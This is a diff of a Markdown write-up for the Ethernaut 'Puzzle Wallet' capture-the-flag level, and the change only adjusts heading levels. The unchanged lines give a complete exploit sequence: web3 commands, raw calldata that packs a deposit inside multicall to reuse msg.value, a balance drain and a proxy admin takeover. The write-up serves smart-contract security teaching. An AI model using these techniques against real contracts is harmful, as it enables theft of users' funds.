@@ -41,7 +41,7 @@ But we can bypass this protection if we **"pack"** one deposit inside another `m
 
 Let's sum up all the actions required together, we will only used web3 js commands :
 
-##### 1. Claim ownership of `PuzzleWallet` contract by changing `pendingAdmin` value to the player's address
+### 1. Claim ownership of `PuzzleWallet` contract by changing `pendingAdmin` value to the player's address
 
 We first calculate the signature of the `proposeNewAdmin` function :
 
@@ -67,13 +67,13 @@ contract.sendTransaction({ data: '0xa6376746000000000000000000000000cabcdefghijk
 
 After that, the `owner`'s  value of `PuzzleWallet` is now your player's address.
 
-##### 2. Add our player's address to the whitelist in order to interact with the different functions
+### 2. Add our player's address to the whitelist in order to interact with the different functions
 
 ```
 contract.addToWhitelist(player);
 ```
 
-##### 3. Prepare the data bytes required for the  ``multicall`` and `deposit` exploit, do not forget to include the parameters expected by the functions
+### 3. Prepare the data bytes required for the  ``multicall`` and `deposit` exploit, do not forget to include the parameters expected by the functions
 
 ``deposit()`` function signature :
 
@@ -105,13 +105,13 @@ Again, we add the `deposit` function signature  :
 packedDeposit = '0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000';
 ```
 
-##### 4. Call `multicall` function with the prepared data bytes with a msg of at least ``0.001 ether``
+### 4. Call `multicall` function with the prepared data bytes with a msg of at least ``0.001 ether``
 
 ```
 contract.multicall([deposit, packedDeposit], { value: toWei('0.001') });
 ```
 
-##### 5. As a result, the contract has now a balance equal to `0.002 ether`, we called twice the deposit function and increased our "available balance" while only depositing `0.001 ether`
+### 5. As a result, the contract has now a balance equal to `0.002 ether`, we called twice the deposit function and increased our "available balance" while only depositing `0.001 ether`
 
 ```
 (await getBalance(instance)).toString();
@@ -119,20 +119,20 @@ contract.multicall([deposit, packedDeposit], { value: toWei('0.001') });
 '0.002'
 ```
 
-##### 6. We can now withdraw `0.002 ether` from the contract using `execute` function and make the contract's balance empty
+### 6. We can now withdraw `0.002 ether` from the contract using `execute` function and make the contract's balance empty
 
 ```
 contract.execute(player, toWei('0.002'), '123');
 ```
 
-##### 7. All the protections are now gone, we can now change `maxBalance` value to finally become the owner of the `PuzzleProxy` contract
+### 7. All the protections are now gone, we can now change `maxBalance` value to finally become the owner of the `PuzzleProxy` contract
 
 ```
 contract.setMaxBalance('1116821831790595974849218070050646934865281521986');
 ```
 
 
-#### BONUS : Retrieve the address of the proxy's contract
+## BONUS : Retrieve the address of the proxy's contract
 
 Once we get our game instance, we only know the `PuzzleWallet` 's contract address. 
 
